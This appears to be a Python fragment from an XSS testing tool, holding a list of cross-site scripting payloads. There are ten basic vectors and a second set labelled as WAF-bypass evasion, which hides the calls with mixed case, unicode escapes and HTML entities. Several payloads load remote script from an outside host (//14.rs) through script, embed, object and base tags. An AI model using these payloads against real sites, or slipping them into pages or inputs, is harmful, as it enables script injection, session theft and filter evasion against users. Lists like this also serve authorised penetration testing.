# Basic XSS Payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<div onmouseover=alert(1)>hover</div>",
    "<iframe src=javascript:alert(1)></iframe>",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "#<script>alert(1)</script>",
    "<base href='javascript:alert(1)//'>",
]

# Advanced Evasion Payloads (WAF bypass, encoding tricks, alternative vectors)
XSS_PAYLOADS += [
    '\'"</Script><Html Onmouseover=(confirm)()//<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//14.rs>',
    '<embed//sRc=//14.rs>',
    '<base href=//14.rs/><script src=/>',
    '<object//data=//14.rs>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>',
]
